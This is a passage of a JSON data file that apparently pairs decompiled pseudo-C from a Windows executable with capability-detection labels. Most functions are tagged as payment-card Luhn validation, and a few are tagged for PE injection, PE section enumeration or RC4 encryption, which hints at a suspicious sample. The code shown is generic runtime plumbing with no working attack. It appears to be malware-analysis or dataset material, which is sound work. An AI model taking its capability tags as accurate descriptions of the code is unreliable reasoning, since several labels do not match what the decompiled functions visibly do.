        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004134c0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x413575;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00415110();\n    uVar3 = var_4h;\n    iVar2 = (***0x4928b8)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004056f4();\n        cVar1 = fcn.0040b760();\n        if (cVar1 == '\\0') {\n            fcn.00411244();\n        }\n        else {\n            _var_10h = _var_20h;\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.00411244();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.0040546c(0x41357c);\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 335
    },
    "00413584": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.00413584(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x4929e8)(auStack24);\n    fcn.00411244();\n    return CONCAT44(auStack20, 5);\n}\n",
        "token_count": 75
    },
    "004135d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004135d0(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    double dStack12;\n    \n    puStack36 = &fcn.004135d0::pvarg;\n    puStack40 = 0x4135e2;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x413625;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a14();\n    (**0x497984)();\n    fVar1 = fcn.00413680();\n    dStack12 = fVar1;\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41362c;\n    uStack44 = 0x413624;\n    fcn.004115e8();\n    return;\n}\n",
        "token_count": 232
    },
    "00413634": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00413634(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416124();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(5);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "00413b88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413b88(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack48 = 0x413c64;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00415110();\n    uVar3 = var_4h;\n    iVar2 = (***0x4926c4)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004056f4();\n        cVar1 = fcn.0040d11c();\n        if (cVar1 == '\\0') {\n            fcn.004056f4();\n            cVar1 = fcn.0040b77c();\n            if (cVar1 == '\\0') {\n                fcn.00411244();\n            }\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.00411244();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405490(0x413c6b);\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 364
    },
    "00413c74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00413c74(uint arg_8h, uint arg_ch)\n\n{\n    uint pvarg;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    sub.oleaut32.dll_VariantInit(&pvarg);\n    pvarg._0_2_ = 5;\n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    (***0x4929e8)(&pvarg, &pvarg, 0x400, 0, 7);\n    fcn.00411244();\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 159
    },
    "00413cd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.00413cd4(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x4929e8)(auStack24);\n    fcn.00411244();\n    return CONCAT44(auStack20, 7);\n}\n",
        "token_count": 76
    },
    "00413d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413d20(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    double dStack12;\n    \n    puStack36 = &fcn.00413d20::pvarg;\n    puStack40 = 0x413d32;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x413d75;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a14();\n    (**0x497984)();\n    fVar1 = fcn.00413dd0();\n    dStack12 = fVar1;\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x413d7c;\n    uStack44 = 0x413d74;\n    fcn.004115e8();\n    return;\n}\n",
        "token_count": 235
    },
    "00413d84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00413d84(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416124();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(7);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 143
    },
    "00414120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414120(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x4141cc;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.00415110();\n    uVar3 = var_4h;\n    iVar2 = (***0x492a78)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004056f4();\n        cVar1 = fcn.0040b7d4();\n        if (cVar1 == '\\0') {\n            fcn.00411244();\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.00411244();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.0040546c(0x4141d3);\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 302
    },
    "004141dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.004141dc(uint arg_8h, uint arg_ch)\n\n{\n    uint pvarg;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    sub.oleaut32.dll_VariantInit(&pvarg);\n    pvarg._0_2_ = 5;\n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    (***0x4929e8)(&pvarg, &pvarg, 0x400, 0, 6);\n    fcn.00411244();\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 158
    },
    "0041423c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.0041423c(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x4929e8)(auStack24);\n    fcn.00411244();\n    return CONCAT44(auStack20, 6);\n}\n",
        "token_count": 76
    },
    "00414288": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414288(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    int64_t iStack12;\n    \n    puStack36 = &fcn.00414288::pvarg;\n    puStack40 = 0x41429a;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x4142dd;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a14();\n    (**0x497984)();\n    fVar1 = fcn.00414338();\n    iStack12 = ROUND(fVar1);\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x4142e4;\n    uStack44 = 0x4142dc;\n    fcn.004115e8();\n    return;\n}\n",
        "token_count": 235
    },
    "004142ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.004142ec(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416124();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(6);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "00414838": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414838(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_14h = 0;\n    uStack44 = 0x4148f7;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = &fcn.00414838::pvarg;\n    puStack56 = 0x414863;\n    sub.oleaut32.dll_VariantInit();\n    uStack60 = 0x4148d5;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    (***0x4929e8)(&fcn.00414838::pvarg);\n    fcn.00411244();\n    arg_8h = &fcn.00414838::var_14h;\n    fcn.00405d8c();\n    fcn.00405e78(arg_8h);\n    fcn.004056f4();\n    *in_FS_OFFSET = arg_8h;\n    fcn.004115e8(0x4148dc);\n    return;\n}\n",
        "token_count": 352
    },
    "00414904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414904(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.00414904::pvarg;\n    puStack36 = 0x414919;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x41495a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a14();\n    (**0x497984)();\n    fcn.004149f0();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x414961;\n    uStack40 = 0x414959;\n    fcn.004115e8();\n    return;\n}\n",
        "token_count": 203
    },
    "00414f2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414f2c(uint param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x414fd6;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = &fcn.00414f2c::pvarg;\n    puStack52 = 0x414f54;\n    sub.oleaut32.dll_VariantInit();\n    uStack56 = 0x414fb9;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uVar3 = 8;\n    uVar2 = 0;\n    uVar1 = 0x400;\n    puStack52 = &stack0xfffffffc;\n    (***0x4929e8)(&fcn.00414f2c::pvarg);\n    fcn.00411244();\n    fcn.00405d8c();\n    fcn.00405e78(param_2);\n    *in_FS_OFFSET = param_2;\n    fcn.004115e8(0x414fc0, uVar1, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 364
    },
    "00414fe4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414fe4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.00414fe4::pvarg;\n    puStack36 = 0x414ff9;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x41503a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a14();\n    (**0x497984)();\n    fcn.00415110();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x415041;\n    uStack40 = 0x415039;\n    fcn.004115e8();\n    return;\n}\n",
        "token_count": 205
    },
    "00415664": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00415664(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack32 = &fcn.00415664::pvarg;\n    puStack36 = 0x415679;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x4156ce;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a14();\n    (**0x497984)();\n    if (pvarg != 0xd) {\n        fcn.00410e04();\n    }\n    fcn.00407110();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4156d5;\n    uStack40 = 0x4156cd;\n    fcn.004115e8();\n    return;\n}\n",
        "token_count": 244
    },
    "00415cc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nvoid fcn.00415cc8(void)\n\n{\n    char cVar1;\n    uint16_t in_AX;\n    int32_t *in_FS_OFFSET;\n    uint *puStack552;\n    int32_t iStack548;\n    uint uStack544;\n    uchar *puStack540;\n    uint var_208h;\n    uint var_204h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack540 = &stack0xfffffffc;\n    uStack544 = 0x415dee;\n    iStack548 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffddc;\n    if ((in_AX & 0xfff) < 0x15) {\n        puStack552 = 0x415d0c;\n        puStack540 = &stack0xfffffffc;\n        fcn.004054c0();\n    }\n    else if (in_AX == 0x100) {\n        puStack552 = 0x415d24;\n        puStack540 = &stack0xfffffffc;\n        fcn.004054c0();\n    }\n    else if (in_AX == 0x101) {\n        puStack552 = 0x415d3c;\n        puStack540 = &stack0xfffffffc;\n        fcn.004054c0();\n    }\n    else {\n        cVar1 = fcn.00416124();\n        if (cVar1 == '\\0') {\n            fcn.00409dfc();\n            puStack552 = 0x415daf;\n            fcn.00405784();\n        }\n        else {\n            puStack552 = &fcn.00415cc8::var_104h;\n            fcn.00404520();\n            fcn.00403088();\n            fcn.004056d0();\n        }\n    }\n    if ((in_AX & 0x2000) != 0) {\n        fcn.00405784();\n    }\n    if ((in_AX & 0x4000) != 0) {\n        fcn.00405784();\n    }\n    *in_FS_OFFSET = puStack552;\n    uStack544 = 0x415df5;\n    iStack548 = 0x415ded;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 490
    },
    "00415f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415f30(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if ((arg_8h != *(in_EAX + 4)) && (cVar1 = fcn.00416124(),  cVar1 != '\\0')) {\n        (**(*var_8h + 0x1c))(arg_8h);\n        return;\n    }\n    fcn.004160a4();\n    return;\n}\n",
        "token_count": 125
    },
    "00415f84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00415f84(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t in_ECX;\n    uint var_1h;\n    \n    (**(*in_EAX + 0x38))(&var_1h);\n    return *(arg_8h * 3 + 0x490aa6 + (in_ECX >> 0x18));\n}\n",
        "token_count": 108
    },
    "00415ff8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00415ff8(void)\n\n{\n    uint uVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_5h;\n    \n    uStack16 = 0x416003;\n    *NULL = fcn.00404a0c();\n    uStack16 = 0x497994;\n    uStack20 = 0x416013;\n    var_5h._0_1_ = extraout_DL;\n    sub.kernel32.dll_EnterCriticalSection();\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(stack0xfffffff8 + 4) != 0) {\n        *(*0x497990 + -0x400 + *(stack0xfffffff8 + 4) * 4) = *0x490a64;\n    }\n    *in_FS_OFFSET = uVar1;\n    uStack20 = 0x416062;\n    uStack24 = 0x497994;\n    uStack28 = 0x41605a;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 277
    },
    "004161e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004161e0(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack316;\n    uint uStack312;\n    uchar *puStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_110h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    uStack296 = 0x4162b6;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    uStack304 = 0x497994;\n    puStack308 = 0x416213;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack312 = 0x416299;\n    uStack316 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec4;\n    puStack308 = &stack0xfffffffc;\n    iVar3 = fcn.00406860();\n    if (-1 < iVar3) {\n        iVar3 = iVar3 + 1;\n        iVar4 = 0;\n        do {\n            iVar1 = *(*0x497990 + iVar4 * 4);\n            if ((iVar1 != 0) && (iVar1 != *0x490a64)) {\n                fcn.00404520();\n                fcn.004056d0();\n                cVar2 = fcn.004099fc();\n                if (cVar2 != '\\0') {\n                    *param_2 = iVar1;\n                    break;\n                }\n            }\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack316;\n    puStack308 = 0x4162a0;\n    uStack312 = 0x497994;\n    uStack316 = 0x416298;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 478
    },
    "00416720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416720(uint8_t *param_1, int32_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t *in_EAX;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    \n    piVar3 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar6 = (piVar3 & 0xffffff) + in_EAX;\n        uVar2 = *(**param_2 + 2 + *(**param_2 + 1));\n        uVar4 = *param_1;\n        if (uVar2 <= *param_1) {\n            uVar4 = uVar2;\n        }\n        *puVar6 = uVar4;\n        puVar1 = param_1 + 1;\n        for (uVar5 = uVar4; puVar6 = puVar6 + 1,  uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar6 = *puVar1;\n            puVar1 = puVar1 + 1;\n        }\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(piVar3 + *in_EAX))();\n        return;\n    }\n    (*piVar3)();\n    return;\n}\n",
        "token_count": 330
    },
    "00416774": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00416774(void)\n\n{\n    fcn.00405708();\n    fcn.00416720();\n    return;\n}\n",
        "token_count": 31
    },
    "004167bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004167bc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.004167a8();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 117
    },
    "00416884": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416884(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    code *var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41694b;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    cVar1 = ***param_2;\n    if ((cVar1 == '\\x05') || (cVar1 == '\\n')) {\n        fcn.004056f4();\n        fcn.00416854();\n    }\n    else if (cVar1 == '\\v') {\n        var_8h = param_2[2];\n        if ((var_8h & 0xff000000) == 0xff000000) {\n            puStack32 = &stack0xfffffffc;\n            fcn.00405c84();\n        }\n        else {\n            if ((var_8h & 0xff000000) == 0xfe000000) {\n                var_8h = *(*in_EAX + var_8h);\n            }\n            if (param_2[4] == -0x80000000) {\n                puStack32 = &stack0xfffffffc;\n                (*var_8h)();\n            }\n            else {\n                puStack32 = &stack0xfffffffc;\n                (*var_8h)();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x416952;\n    uStack36 = 0x41694a;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 402
    },
    "00416b68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416b68(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.00416b54();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 118
    },
    "00416ba8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416ba8(uint *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    \n    pcVar1 = *(param_2 + 8);\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar1 & 0xffffff);\n        uVar2 = param_1[1];\n        *puVar3 = *param_1;\n        puVar3[1] = uVar2;\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(pcVar1 + *in_EAX))();\n        return;\n    }\n    (*pcVar1)(*param_1, param_1[1]);\n    return;\n}\n",
        "token_count": 196
    },
    "00416be0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416be0(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    int32_t in_EDX;\n    \n    pcVar1 = *(in_EDX + 8);\n    if (*(in_EDX + 0xb) == 0xff) {\n        puVar2 = in_EAX + (pcVar1 & 0xffffff);\n        *puVar2 = arg_8h;\n        puVar2[1] = arg_ch;\n    }\n    else if (*(in_EDX + 0xb) < 0xfe) {\n        (*pcVar1)(arg_8h, arg_ch);\n    }\n    else {\n        (**(pcVar1 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00416c1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416c1c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    code *pcStack16;\n    \n    pcStack16 = *(param_2 + 8);\n    if ((pcStack16 & 0xff000000) == 0xff000000) {\n        fcn.00407110();\n    }\n    else {\n        if ((pcStack16 & 0xff000000) == 0xfe000000) {\n            pcStack16 = *(*in_EAX + pcStack16);\n        }\n        if (*(param_2 + 0x10) == -0x80000000) {\n            (*pcStack16)();\n        }\n        else {\n            (*pcStack16)();\n        }\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "004184a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004184a8(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 0;\n    iVar4 = *(*(in_EAX + 0xc) + 8);\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar2 = fcn.004197d8();\n            cVar1 = fcn.0040486c();\n            if ((cVar1 != '\\0') && ((iVar3 == 0 || (cVar1 = fcn.0040486c(),  cVar1 != '\\0')))) {\n                iVar3 = iVar2;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 207
    },
    "004188bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
